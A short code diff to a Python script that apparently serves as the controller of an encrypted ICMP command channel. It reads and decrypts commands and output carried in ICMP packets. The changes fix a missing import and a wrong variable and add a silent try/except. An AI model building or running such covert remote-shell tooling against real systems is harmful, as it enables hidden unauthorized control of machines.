@@ -27,6 +27,7 @@ import sys
 import hashlib
 
 from Crypto.Cipher import AES
+from Crypto import Random
 
 from config import password
 
@@ -54,7 +55,7 @@ class Crypt(object):
         return s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
 
     def encrypt(self, buf):
-        raw = self.pad(raw)
+        raw = self.pad(buf)
         iv = Random.new().read(AES.block_size)
         aes = AES.new(self.key, AES.MODE_CBC, iv)
         return iv + aes.encrypt(raw)
@@ -135,8 +136,11 @@ def main():
                 data = icmppacket.get_data_as_string()
 
                 if len(data):
-                    output = encryptor.decrypt(data)
-                    sys.stdout.write(output)
+                    try:
+                        output = encryptor.decrypt(data)
+                        sys.stdout.write(output)
+                    except:
+                        pass
 
                 # Parse command from standard input
                 try:
